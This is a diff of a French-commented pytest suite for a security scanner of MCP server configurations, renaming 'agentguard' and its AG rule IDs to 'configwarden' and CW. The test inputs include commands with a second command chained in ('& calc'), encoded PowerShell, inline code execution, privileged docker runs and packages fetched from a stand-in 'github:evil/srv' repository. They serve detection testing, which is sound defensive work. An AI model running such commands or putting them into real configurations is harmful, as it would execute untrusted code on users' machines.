@@ -1,20 +1,20 @@
-"""Tests v0.3.0 (jour 2) : commandes « enveloppées » et angles morts d'AG101 à AG107.
+"""Tests v0.3.0 (jour 2) : commandes « enveloppées » et angles morts d'CW101 à CW107.
 
 Sous Windows, les guides officiels font souvent lancer un serveur par
 `cmd /c npx -y paquet` ; ailleurs on croise `wsl`, `env`, `sudo` ou `bash -c "…"`.
-Jusqu'ici, agentguard ne regardait que la première commande : le paquet réellement
-lancé n'était jamais vérifié (AG102, AG107…). Décisions du chef de projet du
+Jusqu'ici, configwarden ne regardait que la première commande : le paquet réellement
+lancé n'était jamais vérifié (CW102, CW107…). Décisions du chef de projet du
 8 octobre 2026 :
 - `cmd /c` qui lance un programme en morceaux séparés, sans caractère spécial :
-  pas d'AG101, mais la commande intérieure est analysée ;
-- du code écrit directement dans la configuration (`node -e`, `python -c`) : AG101.
+  pas d'CW101, mais la commande intérieure est analysée ;
+- du code écrit directement dans la configuration (`node -e`, `python -c`) : CW101.
 """
 
 import time
 
 import pytest
 
-from agentguard.scanner import scan
+from configwarden.scanner import scan
 
 
 def ids_for(write_mcp, command: str, args: list[str]) -> list[str]:
@@ -33,17 +33,17 @@ def ids_for_server(write_mcp, server: dict) -> list[str]:
     ("command", "args", "expected"),
     [
         ("cmd", ["/c", "npx", "-y", "pkg@1.2.3"], []),
-        ("cmd", ["/c", "npx", "-y", "github:evil/srv"], ["AG107"]),
-        ("cmd", ["/c", "npx", "-y", "unpinned-pkg"], ["AG102"]),
-        ("C:\\Windows\\System32\\cmd.exe", ["/d", "/s", "/c", "npx", "-y", "pkg"], ["AG102"]),
-        ("cmd", ["/C", "uvx", "--from", "git+https://github.com/evil/srv", "srv"], ["AG107"]),
-        ("wsl.exe", ["-d", "Ubuntu", "--", "npx", "-y", "github:evil/srv"], ["AG107"]),
-        ("wsl", ["npx", "-y", "pkg"], ["AG102"]),
-        ("/usr/bin/env", ["FOO=1", "npx", "-y", "pkg"], ["AG102"]),
-        ("sudo", ["-u", "root", "docker", "run", "--privileged", "img:1"], ["AG106"]),
-        ("timeout", ["30", "npx", "-y", "github:evil/srv"], ["AG107"]),
-        ("npx.cmd", ["-y", "pkg"], ["AG102"]),
-        ("C:\\Program Files\\nodejs\\npx.CMD", ["-y", "github:evil/srv"], ["AG107"]),
+        ("cmd", ["/c", "npx", "-y", "github:evil/srv"], ["CW107"]),
+        ("cmd", ["/c", "npx", "-y", "unpinned-pkg"], ["CW102"]),
+        ("C:\\Windows\\System32\\cmd.exe", ["/d", "/s", "/c", "npx", "-y", "pkg"], ["CW102"]),
+        ("cmd", ["/C", "uvx", "--from", "git+https://github.com/evil/srv", "srv"], ["CW107"]),
+        ("wsl.exe", ["-d", "Ubuntu", "--", "npx", "-y", "github:evil/srv"], ["CW107"]),
+        ("wsl", ["npx", "-y", "pkg"], ["CW102"]),
+        ("/usr/bin/env", ["FOO=1", "npx", "-y", "pkg"], ["CW102"]),
+        ("sudo", ["-u", "root", "docker", "run", "--privileged", "img:1"], ["CW106"]),
+        ("timeout", ["30", "npx", "-y", "github:evil/srv"], ["CW107"]),
+        ("npx.cmd", ["-y", "pkg"], ["CW102"]),
+        ("C:\\Program Files\\nodejs\\npx.CMD", ["-y", "github:evil/srv"], ["CW107"]),
     ],
     ids=[
         "cmd-pinned-ok",
@@ -64,29 +64,29 @@ def test_wrapped_commands_are_analysed(write_mcp, command, args, expected) -> No
     assert ids_for(write_mcp, command, args) == expected
 
 
-# --- AG101 : shells et code en ligne ---------------------------------------------
+# --- CW101 : shells et code en ligne ---------------------------------------------
 
 
 @pytest.mark.parametrize(
     ("command", "args", "expected"),
     [
-        ("cmd", ["/c", "npx -y pkg@1.2.3"], ["AG101"]),
-        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3", "&", "calc"], ["AG101"]),
-        ("cmd", ["/k", "npx", "-y", "pkg@1.2.3", "|", "more"], ["AG101"]),
-        ("bash", ["-lc", "echo hi"], ["AG101"]),
-        ("bash", ["-o", "pipefail", "-c", "echo hi"], ["AG101"]),
-        ("bash", ["-c", "npx -y github:evil/srv"], ["AG101", "AG107"]),
-        ("/usr/bin/env", ["sh", "-c", "echo hi"], ["AG101"]),
-        ("env", ["-i", "PATH=/usr/bin", "bash", "-c", "x"], ["AG101"]),
-        ("wsl.exe", ["bash", "-c", "x"], ["AG101"]),
-        ("cmd", ["/c", "wsl", "bash", "-c", "npx -y github:evil/srv"], ["AG101", "AG107"]),
-        ("pwsh", ["-e", "ZQBjAGgAbwA="], ["AG101"]),
-        ("powershell.exe", ["-NoProfile", "-ec", "ZQBjAGgAbwA="], ["AG101"]),
-        ("pwsh", ["-Com", "Get-Date"], ["AG101"]),
-        ("node", ["-e", "require('child_process')"], ["AG101"]),
-        ("node", ["--eval", "1"], ["AG101"]),
-        ("python3", ["-c", "import os"], ["AG101"]),
-        ("python3.12", ["-c", "import os"], ["AG101"]),
+        ("cmd", ["/c", "npx -y pkg@1.2.3"], ["CW101"]),
+        ("cmd", ["/c", "npx", "-y", "pkg@1.2.3", "&", "calc"], ["CW101"]),
+        ("cmd", ["/k", "npx", "-y", "pkg@1.2.3", "|", "more"], ["CW101"]),
+        ("bash", ["-lc", "echo hi"], ["CW101"]),
+        ("bash", ["-o", "pipefail", "-c", "echo hi"], ["CW101"]),
+        ("bash", ["-c", "npx -y github:evil/srv"], ["CW101", "CW107"]),
+        ("/usr/bin/env", ["sh", "-c", "echo hi"], ["CW101"]),
+        ("env", ["-i", "PATH=/usr/bin", "bash", "-c", "x"], ["CW101"]),
+        ("wsl.exe", ["bash", "-c", "x"], ["CW101"]),
+        ("cmd", ["/c", "wsl", "bash", "-c", "npx -y github:evil/srv"], ["CW101", "CW107"]),
+        ("pwsh", ["-e", "ZQBjAGgAbwA="], ["CW101"]),
+        ("powershell.exe", ["-NoProfile", "-ec", "ZQBjAGgAbwA="], ["CW101"]),
+        ("pwsh", ["-Com", "Get-Date"], ["CW101"]),
+        ("node", ["-e", "require('child_process')"], ["CW101"]),
+        ("node", ["--eval", "1"], ["CW101"]),
+        ("python3", ["-c", "import os"], ["CW101"]),
+        ("python3.12", ["-c", "import os"], ["CW101"]),
     ],
     ids=[
         "cmd-single-string",
@@ -133,7 +133,7 @@ def test_ag101_message_names_the_shell(write_mcp) -> None:
     assert "cmd" in message
 
 
-# --- AG102 : versions vraiment figées ------------------------------------------
+# --- CW102 : versions vraiment figées ------------------------------------------
 
 
 @pytest.mark.parametrize(
@@ -160,13 +160,13 @@ def test_ag101_message_names_the_shell(write_mcp) -> None:
     ],
 )
 def test_only_exact_versions_count_as_pinned(write_mcp, command, package, pinned) -> None:
-    expected = [] if pinned else ["AG102"]
+    expected = [] if pinned else ["CW102"]
     assert ids_for(write_mcp, command, ["-y", package] if command == "npx" else [package]) == (
         expected
     )
 
 
-# --- AG107 : autres sources hors registre --------------------------------------
+# --- CW107 : autres sources hors registre --------------------------------------
 
 
 @pytest.mark.parametrize(
@@ -189,14 +189,14 @@ def test_only_exact_versions_count_as_pinned(write_mcp, command, package, pinned
     ],
 )
 def test_more_untrusted_sources(write_mcp, command, args) -> None:
-    assert ids_for(write_mcp, command, args) == ["AG107"]
+    assert ids_for(write_mcp, command, args) == ["CW107"]
 
 
 def test_local_and_scoped_packages_are_not_untrusted_sources(write_mcp) -> None:
     assert ids_for(write_mcp, "npx", ["-y", "@scope/pkg@1.2.3"]) == []
 
 
-# --- AG104 et AG106 : dossiers personnels --------------------------------------
+# --- CW104 et CW106 : dossiers personnels --------------------------------------
 
 
 @pytest.mark.parametrize(
@@ -215,7 +215,7 @@ def test_local_and_scoped_packages_are_not_untrusted_sources(write_mcp) -> None:
 )
 def test_home_and_drive_roots_are_broad(write_mcp, folder) -> None:
     args = ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", folder]
-    assert ids_for(write_mcp, "npx", args) == ["AG104"]
+    assert ids_for(write_mcp, "npx", args) == ["CW104"]
 
 
 def test_project_folder_inside_home_is_fine(write_mcp) -> None:
@@ -234,14 +234,14 @@ def test_project_folder_inside_home_is_fine(write_mcp) -> None:
     ],
 )
 def test_personal_folders_mounted_in_a_container(write_mcp, mount) -> None:
-    assert ids_for(write_mcp, "docker", ["run", "-v", mount, "img:1"]) == ["AG106"]
+    assert ids_for(write_mcp, "docker", ["run", "-v", mount, "img:1"]) == ["CW106"]
 
 
 def test_project_mount_is_fine(write_mcp) -> None:
     assert ids_for(write_mcp, "docker", ["run", "-v", "./data:/data", "img:1"]) == []
 
 
-# --- AG103 : modèles à remplir, références et mots de passe dans une URL --------
+# --- CW103 : modèles à remplir, références et mots de passe dans une URL --------
 
 
 @pytest.mark.parametrize(
@@ -265,7 +265,7 @@ def test_placeholders_and_references_are_not_secrets(write_mcp, value) -> None:
 def test_literal_default_value_is_a_secret(write_mcp) -> None:
     server = {"command": "srv", "env": {"API_KEY": "${API_KEY:-literal-default-0123456789}"}}
     findings = scan(write_mcp({"s": server})).findings
-    assert [f.rule.id for f in findings] == ["AG103"]
+    assert [f.rule.id for f in findings] == ["CW103"]
     assert "literal-default-0123456789" not in findings[0].message
 
 
@@ -276,7 +276,7 @@ def test_password_inside_a_url_is_a_secret(write_mcp) -> None:
         "env": {"DATABASE_URL": f"postgres://app:{password}@db.example/app"},
     }
     findings = scan(write_mcp({"s": server})).findings
-    assert [f.rule.id for f in findings] == ["AG103"]
+    assert [f.rule.id for f in findings] == ["CW103"]
     assert password not in findings[0].message
 
 
@@ -297,16 +297,16 @@ def test_url_without_literal_password_is_fine(write_mcp, url) -> None:
 
 def test_endless_wrappers_do_not_loop(write_mcp) -> None:
     start = time.perf_counter()
-    assert ids_for(write_mcp, "env", ["env"] * 50_000 + ["bash", "-c", "x"]) == ["AG101"]
+    assert ids_for(write_mcp, "env", ["env"] * 50_000 + ["bash", "-c", "x"]) == ["CW101"]
     assert time.perf_counter() - start < 5
 
 
 def test_huge_shell_script_is_fast(write_mcp) -> None:
     start = time.perf_counter()
     script = "npx -y github:evil/srv; " + "echo 'a\"b' " * 60_000
-    assert ids_for(write_mcp, "bash", ["-c", script]) == ["AG101", "AG107"]
+    assert ids_for(write_mcp, "bash", ["-c", script]) == ["CW101", "CW107"]
     assert time.perf_counter() - start < 5
 
 
 def test_unbalanced_quotes_in_script_do_not_crash(write_mcp) -> None:
-    assert ids_for(write_mcp, "sh", ["-c", "npx -y 'github:evil/srv"]) == ["AG101", "AG107"]
+    assert ids_for(write_mcp, "sh", ["-c", "npx -y 'github:evil/srv"]) == ["CW101", "CW107"]
